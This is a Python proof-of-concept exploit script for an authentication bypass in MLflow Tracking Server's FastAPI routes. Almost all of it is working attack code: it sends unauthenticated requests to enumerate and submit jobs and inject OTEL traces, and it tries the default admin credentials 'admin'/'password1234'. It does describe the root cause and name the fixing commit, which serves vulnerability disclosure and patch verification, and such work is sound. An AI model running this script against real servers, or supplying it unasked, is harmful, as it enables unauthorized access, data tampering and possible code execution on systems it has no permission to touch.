#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : MLflow FastAPI Route Authentication Bypass
# CVE            : CVE-2026-2635 (Bypass)
# Vendor         : MLflow (Databricks)
# Product        : MLflow Tracking Server
# Affected       : v2.22.0 – v3.9.x (with --app-name basic-auth)
# Type           : CWE-306 - Missing Authentication for Critical Function
# CVSS           : 9.8 (Critical)
# Platform       : Python / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-2635 Bypass: Unauthenticated FastAPI Route Access

Even when the default admin password is changed (recommended CVE-2026-2635
mitigation), FastAPI routes bypass the auth middleware entirely. The
_find_fastapi_validator() function only handles /gateway/ routes — all other
FastAPI routes return validator=None, passing requests through without auth.

BYPASS ROUTES:
  1. /v1/traces (POST)             — OTEL trace injection → data integrity
  2. /ajax-api/3.0/jobs/search     — Job enumeration → info disclosure
  3. /ajax-api/3.0/jobs/           — Job submission → potential code exec
  4. /ajax-api/3.0/jobs/{id}       — Job retrieval → info disclosure
  5. /ajax-api/3.0/jobs/cancel/{id} — Job cancellation → availability impact

FIX STATUS:
  Fixed in v3.10.0 (commit 0b15c3ca5, PR #20920). However, v3.10.0 still
  ships with default credentials, so CVE-2026-2635 itself remains unpatched.

PREREQUISITES:
  - MLflow server with --app-name basic-auth enabled
  - Network access to MLflow tracking server
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2026-2635
  - https://github.com/mlflow/mlflow/pull/20920
"""

import json
import sys
import urllib.request
import urllib.error
import base64

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-2635 BYPASS — Unauthenticated FastAPI Routes     ║
║  Affected: MLflow v2.3.0 – v3.10.0 with --app-name         ║
║           basic-auth                                        ║
║  Bypass: FastAPI routes skip auth middleware entirely        ║
╚══════════════════════════════════════════════════════════════╝
"""


def http_request(url, method="GET", data=None, headers=None, auth=None):
    """Make an HTTP request and return (status_code, response_body)."""
    if headers is None:
        headers = {}
    if data is not None and isinstance(data, (dict, list)):
        data = json.dumps(data).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    elif data is not None and isinstance(data, str):
        data = data.encode("utf-8")
    elif data is not None and isinstance(data, bytes):
        pass  # already bytes

    if auth:
        username, password = auth
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers["Authorization"] = f"Basic {creds}"

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body
    except Exception as e:
        return None, str(e)


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2]
    base_url = f"http://{host}:{port}"

    print(BANNER)
    print(f"Target: {host}:{port}")
    print()

    checks_passed = 0
    checks_total = 0

    # ================================================================
    # Step 1: Verify authentication is enforced on Flask routes
    # ================================================================
    checks_total += 1
    print("[Step 1] Verifying Flask routes enforce authentication ...")
    status, body = http_request(
        f"{base_url}/api/2.0/mlflow/experiments/search",
        method="POST",
        data={"max_results": 10}
    )
    if status == 401:
        print(f"  [OK]   Flask route returned HTTP {status} — authentication enforced")
        checks_passed += 1
    else:
        print(f"  [WARN] Flask route returned HTTP {status} — expected 401")
        print(f"         This may indicate auth is not enabled (--app-name basic-auth)")

    # ================================================================
    # Step 2: Verify default credentials are rejected (patched)
    # ================================================================
    checks_total += 1
    print()
    print("[Step 2] Verifying default credentials are rejected (fix applied) ...")
    status, body = http_request(
        f"{base_url}/api/2.0/mlflow/users/get?username=admin",
        auth=("admin", "password1234")
    )
    if status == 401:
        print(f"  [OK]   Default credentials rejected (HTTP {status})")
        print("         The password fix for CVE-2026-2635 appears to be applied")
        checks_passed += 1
    elif status == 200:
        print(f"  [WARN] Default credentials ACCEPTED (HTTP {status})")
        print("         The fix is NOT applied — default credentials still work")
        print("         Continuing with bypass to show additional attack surface...")
    else:
        print(f"  [INFO] Unexpected response (HTTP {status})")

    # ================================================================
    # Step 3: BYPASS — Access Jobs API without authentication
    # ================================================================
    checks_total += 1
    print()
    print("[Step 3] BYPASS: Accessing Jobs API without authentication ...")
    print("         POST /ajax-api/3.0/jobs/search (no credentials)")
    status, body = http_request(
        f"{base_url}/ajax-api/3.0/jobs/search",
        method="POST",
        data={}
    )
    if status == 200:
        print(f"  [BYPASS!] Jobs search returned HTTP {status} — NO AUTH REQUIRED!")
        try:
            jobs_data = json.loads(body)
            job_count = len(jobs_data.get("jobs", []))
            print(f"            Retrieved {job_count} job(s) without authentication")
        except Exception:
            print(f"            Response: {body[:200]}")
        checks_passed += 1
    elif status == 401:
        print(f"  [FIXED] Jobs route properly requires authentication (HTTP {status})")
    else:
        print(f"  [INFO] Jobs search returned HTTP {status}")
        print(f"         Response: {body[:200]}")

    # ================================================================
    # Step 4: BYPASS — Access OTEL Trace Ingestion without auth
    # ================================================================
    checks_total += 1
    print()
    print("[Step 4] BYPASS: Accessing OTEL Trace API without authentication ...")
    print("         POST /v1/traces (no credentials)")

    # Send a request with valid headers but minimal protobuf data
    # We expect 400 (bad format) NOT 401 (unauthorized)
    status, body = http_request(
        f"{base_url}/v1/traces",
        method="POST",
        data=b"",
        headers={
            "Content-Type": "application/x-protobuf",
            "X-Mlflow-Experiment-Id": "0",
        }
    )
    if status in (400, 422):
        # 400 or 422 = format/validation error, but NOT auth error
        # This proves the request passed through the auth middleware
        print(f"  [BYPASS!] OTEL traces returned HTTP {status} (format error, NOT auth error)")
        print(f"            The request bypassed authentication entirely!")
        print(f"            With valid protobuf data, traces can be injected without auth")
        try:
            error_data = json.loads(body)
            print(f"            Error detail: {error_data.get('detail', body[:100])}")
        except Exception:
            print(f"            Response: {body[:200]}")
        checks_passed += 1
    elif status == 401:
        print(f"  [FIXED] OTEL route properly requires authentication (HTTP {status})")
    else:
        print(f"  [INFO] OTEL traces returned HTTP {status}")
        print(f"         Response: {body[:200]}")

    # ================================================================
    # Step 5: BYPASS — Attempt job submission without auth
    # ================================================================
    checks_total += 1
    print()
    print("[Step 5] BYPASS: Attempting job submission without authentication ...")
    print("         POST /ajax-api/3.0/jobs/ (no credentials)")
    status, body = http_request(
        f"{base_url}/ajax-api/3.0/jobs/",
        method="POST",
        data={
            "job_name": "invoke_scorer",
            "params": {"test": "bypass_poc"},
            "timeout": 30
        }
    )
    if status in (200, 422, 500, 400):
        # Any of these mean the request passed auth and reached the handler
        if status == 401:
            print(f"  [FIXED] Jobs submit properly requires authentication (HTTP {status})")
        else:
            print(f"  [BYPASS!] Jobs submit returned HTTP {status} — NO AUTH REQUIRED!")
            try:
                resp_data = json.loads(body)
                detail = resp_data.get("detail", body[:200])
                if isinstance(detail, list):
                    detail = "; ".join(d.get("msg", str(d)) for d in detail)
                print(f"            Server response: {detail[:200]}")
            except Exception:
                print(f"            Response: {body[:200]}")
            print(f"            (Job execution may fail for other reasons, but auth was bypassed)")
            checks_passed += 1
    elif status == 401:
        print(f"  [FIXED] Jobs submit properly requires authentication (HTTP {status})")
    else:
        print(f"  [INFO] Jobs submit returned HTTP {status}")

    # ================================================================
    # Step 6: BYPASS — Verify Assistant API auth bypass (localhost-blocked)
    # ================================================================
    checks_total += 1
    print()
    print("[Step 6] Testing Assistant API (expected: blocked by localhost check) ...")
    print("         GET /ajax-api/3.0/mlflow/assistant/config (no credentials)")
    status, body = http_request(
        f"{base_url}/ajax-api/3.0/mlflow/assistant/config"
    )
    if status == 403:
        try:
            resp_data = json.loads(body)
            detail = resp_data.get("detail", "")
            if "same host" in detail.lower() or "localhost" in detail.lower():
                print(f"  [INFO] HTTP {status} — Blocked by localhost check, NOT by authentication")
                print(f"         Detail: {detail}")
                print(f"         Note: This route also bypasses auth middleware, but has a")
                print(f"         separate localhost-only restriction. Via SSRF, it would be accessible.")
                checks_passed += 1
            else:
                print(f"  [INFO] HTTP {status} — {detail}")
        except Exception:
            print(f"  [INFO] HTTP {status} — {body[:200]}")
    elif status == 401:
        print(f"  [FIXED] Assistant route properly requires authentication (HTTP {status})")
    elif status == 200:
        print(f"  [BYPASS!] Assistant config returned HTTP {status} — NO AUTH REQUIRED!")
        checks_passed += 1
    else:
        print(f"  [INFO] HTTP {status} — {body[:200]}")

    # ================================================================
    # Step 7: Compare with Flask route (control test)
    # ================================================================
    checks_total += 1
    print()
    print("[Step 7] Control test: Flask route still requires authentication ...")
    print("         POST /api/2.0/mlflow/experiments/search (no credentials)")
    status, body = http_request(
        f"{base_url}/api/2.0/mlflow/experiments/search",
        method="POST",
        data={"max_results": 10}
    )
    if status == 401:
        print(f"  [OK]   Flask route correctly returns HTTP {status}")
        print("         This confirms the bypass is specific to FastAPI routes")
        checks_passed += 1
    else:
        print(f"  [WARN] Flask route returned HTTP {status} — expected 401")

    # ================================================================
    # Summary
    # ================================================================
    print()
    print("=" * 62)

    bypass_found = False
    # Check if any bypass was found (Steps 3-5)
    # We re-test the key bypass to determine
    status_jobs, _ = http_request(
        f"{base_url}/ajax-api/3.0/jobs/search",
        method="POST",
        data={}
    )
    status_otel, _ = http_request(
        f"{base_url}/v1/traces",
        method="POST",
        data=b"",
        headers={
            "Content-Type": "application/x-protobuf",
            "X-Mlflow-Experiment-Id": "0",
        }
    )

    if status_jobs == 200 or (status_otel is not None and status_otel != 401):
        bypass_found = True

    if bypass_found:
        print("[BYPASS CONFIRMED] FastAPI routes accessible without authentication!")
        print()
        print("Bypass Summary:")
        print("  • Jobs API (/ajax-api/3.0/jobs/*) — fully accessible without auth")
        print("  • OTEL Traces API (/v1/traces) — accessible without auth")
        print("  • Assistant API — bypasses auth but has separate localhost check")
        print()
        print("Impact:")
        print("  • Job enumeration: search and view all background jobs (info disclosure)")
        print("  • Job submission: submit scorer jobs without auth (potential code exec)")
        print("  • Job cancellation: disrupt running jobs (availability impact)")
        print("  • Trace injection: write OTEL traces to any experiment (data integrity)")
        print("  • SSRF to assistant: if chained with SSRF, full assistant access")
        print()
        print("Root Cause:")
        print("  The FastAPI permission middleware only validates /gateway/ routes.")
        print("  All other FastAPI routes return validator=None, causing the")
        print("  middleware to pass the request through WITHOUT authentication.")
        print()
        print("Fix Required:")
        print("  Apply commit 0b15c3ca5 (PR #20920) which adds validators for")
        print("  /v1/traces, /ajax-api/3.0/jobs, and /ajax-api/3.0/mlflow/assistant.")
    else:
        print("[NO BYPASS] All routes properly require authentication")
        print(f"  {checks_passed}/{checks_total} checks passed")

    print()
    return 0 if bypass_found else 1


if __name__ == "__main__":
    sys.exit(main())
